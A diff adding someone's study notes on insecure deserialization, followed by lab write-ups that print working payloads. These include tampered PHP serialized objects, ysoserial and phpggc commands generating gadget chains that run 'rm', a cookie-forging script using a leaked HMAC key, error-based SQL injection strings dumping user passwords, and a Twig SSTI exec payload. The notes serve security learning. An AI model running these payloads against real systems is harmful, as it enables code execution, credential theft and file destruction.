@@ -1,0 +1,293 @@
+Serialization object --> Stream of bytes --> file, db, memory --> Stream of bytes -> Deserialization object
+
+Serialization: 
+- Process of converting complex data structures into flat format that can be sent and received as a sequential stream of bytes
+- Help:
+    + Write complex data to inter-process memory, file or database
+    + Send complex data (Ex: over a network, between different components, API call,..)
+Deserialization:
+- Process of restoring byte stream to a fully functional replica of original object
+
+How object are serialized depend on the language:
+- Some serialize into binary formats
+- Whereas others use different string formats
+- Varying degrees of human readability
+
+Note:
+- All original object attribute are stored in serialized data stream, include any private fields
+- To prevent field from being serialized, it must be explicity marked as "transient" in class declaration
+- This maybe referred to as marshalling (Ruby) or pickling (Python)
+
+Insecure deserialization:
+- Known as an "object injection" vuln
+- User controllable data is deserialized by website, enable attacker manipulate serialized objects
+- Possible replace serialized object with an object of different class
+    + Might cause an exception
+- Many deserialization-base attacks are completed before deserialization is finished
+
+How insecure deserialization vuln arise:
+- Lack of understanding how dangerous deserializing user input. Ideally, should never deserialized at all
+- Web owner think they safe because they implement some form of additional check on the deserialized data.
+    + Often ineffective, virtually impossible to implement validation or sanitization to account for every eventuality
+- Deserialized object are often assumed to be trustworthy
+    + Even if binary serialization format, it's possible for attacker to exploit, just require more effort
+- Hard to predict which method can be invoked on the malicious data
+    + Chain together a long series of unexpected method invocation
+    + Passing data into a sink that completely unrelated to initial source
+    -> Impossible to anticipate the flow of malicious data and plug every potential hole
+
+Impact:
+- Provide entry point to a massively increased attack surface
+- Allow attacker to reuse existing code in harmful way, often RCE
+- Even RCE not possible, it still can lead to privilege escalation, arbitrary file access, DOS attack
+
+Exploiting insecure deserialization vulnerabilities:
+- Example from PHP, Ruby, Java deserialization
+- How to identify:
+    + It is simple whether whitebox or blackbox testing
+    + During auditing, look at all data being passed into website and try identify anything that look like serialized data
+    + Easily identified if you know format that different language use.
+    + Tip: Burp Scanner automatically flag any HTTP messages that appear to contain serialized object
+    + PHP serialization format:
+        $user->name = "carlos";
+        $user->isLoggedIn = true;
+        Serialized: O:4:"User":2:{s:4:"name":s:6:"carlos";s:10:"isLoggedIn":b:1;}
+        + Native method are serialize() and unserialize()
+    + Java serialization format:
+        + Use binary serialization formats, more difficult to read
+        + Can still identify if you know how to recognize a few tell-tale signs
+            + Always begin with the same bytes, 'ac ed' in hexadecimal and rO0 in Base64
+        + Class that implement the interface 'java.io.Serializable' can be serialized and deserialized
+        + If have source code, try to find readObject(), used to read and deserialize data from InputStream
+- Manipulating serialized objects:
+    + Modifying object attributes: (1)
+        + Consider website that uses a serialized User object to store data about user's session in cookie. If attacker spotted this, they might decode to get serialized object.
+        + Then modify value to privilege escalation
+        Example: 
+            $user = unserialize($_COOKIE);
+            if ($user->isAdmin === true) {
+            // allow access to admin interface
+            }
+    + Modifying data types: (2)
+        + PHP logic is particularly vuln to this because of operator (==) when comparing different data types.
+            Example: 
+                5 == "5" => true (string->integer)
+                5 == "5 of something" --> 5 == 5 => true (string->integer)
+                (base on the initial number, the rest will be ignored)
+                0 == "Example string" => true (string->integer)
+                (PHP 7.x and earlier)
+        + If attacker modified password to integer 0 instead of string and password does not start with a number, it will return true
+            Example:
+                $login = unserialize($_COOKIE)
+                if ($login['password'] == $password) {
+                // log in successfully
+                }
+            Note: only possoble because deserialization preserves the data typek, if fetch password from request directly, 0 would be convert to string
+- Using application functionality: (3)
+    + Might perform dangerous operation on data from a deserialized object
+    + Deleting their own user account would then delete this arbitrary file as well.
+    Example:
+        User delete -> user's picture profile delete by filepath attribute
+    + Could use this to delete other file by modify the path
+- Magic methods:
+    + Special subset of methods, that are invoked automatically whenever a particular event or scenario occurs
+    + Common feature of OOP, can be custom by dev to execute any code they want
+    + Example:
+        PHP: __construct()
+        Python: __init__
+    + Can become dangerous when the code they execute handles attack-controllable data
+        Example: from a deserialized object
+    + Some language have magic method invoked automatically during deserialization process
+        Example: 
+            PHP: unserialize() look for and invokes onject __wakeup() magic method
+            Java: ObjectInputStream.readObject() read data from initial byte steam and acts like a constructor for "re-initializing" a serialized object --> calling magic method re-initial
+- Injecting arbitrary objects: (4)
+    + In OOP, method available are determined by its class
+    + If attacker can manipulate class of object being passed in as serialized data, they can influence what code is executed after and even during deserialization
+    + The fact that, object is not of the expected class does not matter, it might cause exception, but malicious object will already be instantiated by then
+    + Can used to be initiate more complex attack involving long series, known as "gadget chanin"
+- Gadget chains:
+    + "Gadget" is a snippet of code exists can help attacker achieve a particular goal
+    + Attacker's goal: might invoke a method that pass their input into another gadget
+    + By chaining multiple gadgets together, attacker can pass input into a dangerous "sink gadget", where can cause maximum damage
+    + Unlike other types of exploit, all codes exist on website, only thing attacker controls is the data passed into gadget chain, done using magic method, known as "kick-off gadget"
+    + Working with pre-built gadget chains: (5)
+        + https://github.com/frohoff/ysoserial
+        + Manually identify almost impossible without source code access.
+        + Fortunately, there are several tools provide pre-discovered chains that have been successfully exploited (even if you don't have access to source code)
+        + ysoserial: tool for Java deserialization, provided gadget chains for library that application is using. It create serialized object based on the selected chain. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gafget chains manuallly
+            Example: Java 16 and above
+                java \
+                    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+                    --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+                    --add-opens=java.base/java.net=ALL-UNNAMED \
+                    --add-opens=java.base/java.util=ALL-UNNAMED \
+                    -jar ysoserial-all.jar [payload] '[command]'
+        + Detect insecure deserialization on virtually any server:
+            + URLDNS: trigger DNS lookup. It does not rely on specific vuln library and works in any known Java version
+                Example: java -jar ysoserial.jar URLDNS 'http://YOUR.burpcollaborator.net'
+            + JRMPClient: cause server to try establishing a TCP connection to the supplied IP address (need provide raw IP rether than hostname), useful in enviroment where all outbound traffic is firewalled. You can try gen payload with 2 different IP (local and external). If response immediately for a local, but hangs for external, causing delay in response. The subtle time different in reponse can help you detect whether deserialization occurs on server, even in blind cases
+                Example:
+                    java -jar ysoserial.jar JRMPClient '192.168.1.1'  # local IP
+                    java -jar ysoserial.jar JRMPClient '1.2.3.4'      # external
+        + PHP Generic Gadget Chains: (6)
+            + https://github.com/ambionics/phpggc
+    + Working with documented gadget chains: (7)
+        + Not always be a dedicated tool available for exploiting
+        + You will need to looking online to see document exploit can adapt manually
+
+- Creating your own exploit: (8, 9)
+    + Need when off-the-shelf gadget chains and documented exploit are unsuccessful
+    + To build it, you cartainly need source code access
+        + First step is to identify class contain magic method that invoke during deserialization, see if it does anything dangerous to user-controllable attributes
+        + If is not exploitable on its own, can serve as "kick-off gadget", study any method that invoked by this, look at each methods that subsequently invoke
+        + Repeat process until dead end or identify a dangerous sink gadget into which you controllable data is passed
+        + Construct your own serialized object contain payload
+        + Look out for opportunities to use this extra attacker surface to trigger secondary vuln
+
+- PHAR deserialization: (PHP archieve) (10)
+    + https://sec.vnpt.vn/2019/08/ky-thuat-khai-thac-lo-hong-phar-deserialization
+    + In PHP, sometimes possible to exploit deserialization even if there no use of unserialize() method
+    + PHAR file:
+        + Stub: file PHP contain "<?php __HALT_COMPILER();"
+        + Manifest: content description of file
+        + Content: file data
+        + Signature: for integrity verification (optional)
+    + Can be exploit through phar:// stream wrapper
+    + Process:
+        + file_exist("phar://upload/avatar.jpg")
+        + PHP read PHAR Manifest
+        + Auto call unserialize() in metadata
+        + Trigger __wakeup() / __destruct()
+    + Must have:
+        + upload file function
+        + server calling to vuln system method (example: file_exist, is_file(), fopen(), ...)
+        + code base class have gadget chain
+    + Polygot file technique:
+        + https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf
+        + Header and mime type is JPG -> bypass validation upload
+        + Payload PHAR hidden in file
+        + phar:// stream don't check meme type, behavior depend on metadata in file
+
+- Solution for all lab: https://hackmd.io/@janlele91/BJoDWesCs
+
+
+01_Modifying_serialized_objects
+- As the lab description, we know that website store serialized object in cookie
+- So we just decode and modify that admin value to true
+- Old object: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
+- New object: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
+
+02_Modifying_serialized_data_types
+- PHP version <= 7.x
+- "xxxx" == 0 => true
+- Old object: O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"nqp177zn9dusjkkz13fap7k4yr0yu8hm";}
+- New object: O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+
+03_Using_application_functionality_to_exploit_insecure_deserialization
+- User delete -> Delete image location in serialized object
+- Old object: O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"tciskosk13tbmebsplav4pyfyk0uefp9";s:11:"avatar_link";s:18:"users/gregg/avatar";}
+- New object: O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"tciskosk13tbmebsplav4pyfyk0uefp9";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+
+04_Arbitrary_object_injection_in_PHP
+- If you read source code (or sitemap), you will see it contains /libs/CustomTemplate.php
+    + But you are blocked if try to read that file
+    + Trick: append ~ to the end of file
+        + Some text editor automatically generate backup files to prevent data loss
+        + Even if browser block we read file, we still can try to access the backup version
+- Go to backup file, we see that there is a class CustomTemplate
+    + Contain _destruct() magic method that could unlink() file (delete file)
+    + So we try to custom payload that link to /home/carlos/morale.txt
+    + Then replace current cookie by that payload
+    + Even if it cause exception, it already constructor and destructor before throw error
+- New object: O:14:"CustomTemplate":2:{S:18:"template_file_path";S:23:"/home/carlos/morale.txt";S:14:"lock_file_path";S:23:"/home/carlos/morale.txt";}
+
+05_Exploiting_Java_deserialization_with_Apache_Commons
+- Download: https://github.com/frohoff/ysoserial
+- Generate payload:
+    java \
+        --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
+        --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
+        --add-opens=java.base/java.net=ALL-UNNAMED \
+        --add-opens=java.base/java.util=ALL-UNNAMED \
+        -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
+- Paste the payload to session
+
+06_Exploiting_PHP_deserialization_with_a_pre_built_gadget_chain
+- Modify cookie to invalid -> trigger error
+    + Internal Server Error: Symfony Version: 4.3.6
+    + /cgi-bin/phpinfo.php -> Php version: 7.4.3
+                            -> Secret key: saficvjg82dp1xei0r6tkapaxig1bgnf
+- Download: https://github.com/ambionics/phpggc (Need php to run)
+- Execute: php phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' -o payload.txt
+- Create file to generate payload:
+<?php
+$object = base64_encode(trim(file_get_contents('payload.txt')));;
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+- Paste the payload to session
+
+07_Exploiting_Ruby_deserialization_using_a_documented_gadget_chain
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md#marshal-deserialization
+- Guide: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
+- Compile ruby file: docker run -i -v "%cd%":/app ruby:2.7 ruby /app/generate_payload.rb > payload.txt
+- Just use that base64 payload to inject to deserialized cookie
+- I don't know how to trigger version error before this yet, but you can try to inject to all version from 2.x - 3.x to test
+- This is hard for now, i still need to check the solution
+
+08_Developing_a_custom_gadget_chain_for_Java_deserialization
+- You can find this in source code /backup/AccessTokenUser.java
+    + Go to /backup folder and see 1 more file ProductTemplate.java
+    + This file using sql statement
+- Try to trigger sql injection and checking error
+    + The error message confirms that the website is vulnerable to Postgres-based SQL injection via this deserialized object.
+- When you try to identify tables name
+    + If place table_name in string type column, it won't display anything important
+        payload: ' UNION SELECT table_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM information_schema.tables--
+        error: java.lang.ClassCastException: Cannot cast data.productcatalog.ProductTemplate to lab.actions.common.serializable.AccessTokenUser
+    + But if place in numeric type integer
+        payload: ' UNION SELECT NULL, NULL, NULL, table_name, NULL, NULL, NULL, NULL FROM information_schema.tables--
+        error: java.io.IOException: org.postgresql.util.PSQLException: ERROR: UNION types integer and name cannot be matched
+    + So we cast a string to int to trigger error
+        payload: ' UNION SELECT NULL, NULL, NULL, CAST(table_name as int), NULL, NULL, NULL, NULL FROM information_schema.tables--
+        error: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;users&quot;
+        payload: ' UNION SELECT NULL, NULL, NULL, CAST(string_agg(table_name, ',') as int), NULL, NULL, NULL, NULL FROM information_schema.tables--
+        error: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;[list_of_tables]&quot;
+    + We notice important table like ['users', 'products'] exist
+- So you know that website have table named users
+    + Try to identify all columns name
+        payload: ' UNION SELECT NULL, NULL, NULL, CAST(string_agg(column_name, ',') as int), NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='users'--
+        error: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;username,password,email&quot;
+    + Then try to parse data from table
+        payload: ' UNION SELECT NULL, NULL, NULL, CAST(string_agg(username,',')||'~'||string_agg(password,',') as int), NULL, NULL, NULL, NULL FROM users--
+        error: java.io.IOException: org.postgresql.util.PSQLException: ERROR: invalid input syntax for type integer: &quot;administrator,carlos,wiener~cexn3gdfy6zt6xlxarsp,angcybkpw92qf6lldxgb,peter&quot;
+- Finally, just login administrator account to delete carlos acc
+
+09_Developing_a_custom_gadget_chain_for_PHP_deserialization
+- Read backup file /cgi-bin/libs/CustomTemplate.php~
+- Analyze php code:
+    + __sleep(): argument that allow to pass in serialize(), other will ignore
+    + __wakeup(): trigger after deserialize() and assign property pass in
+    + __get(): trigger when calling property that does not exist in class (example: DefaultMap->nonexist)
+    + call_user_func(function, argument): calling function(argument) (Example: system(id) or exec(id))
+    + when deserialize(), property is assign directly to any property, bypass all access control and constructor
+- Payload:
+    + New object: O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:6:"system";}}
+
+10_Using_PHAR_deserialization_to_deploy_a_custom_gadget_chain
+- This lab is using polygot technique and phar deserialization
+- First you have to upload jpg file contain phar deserialize content, then calling by phar:// to trigger
+- Create image payload:
+    + https://github.com/kunte0/phar-jpg-polyglot
+    + You just need to rewrite the POP chain yourself
+    + Research about Twig SSTI payload: https://heapcreate.com/posts/understanding_ssti/
+    + {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}
+    + To trigger render in __toString, assign $blog->desc = "..."
+    + Compile: php -d phar.readonly=0 phar_jpg_polyglot.php (need flag for not thown error)
+- Go to /cgi-bin/avatar.php?avatar=phar://wiener to trigger function isTemplateLocked() { file_exists(...) }
+
+
+Notes:
+- I'm still bad at this topic, need more experience
+- Learn more about construct my own payload
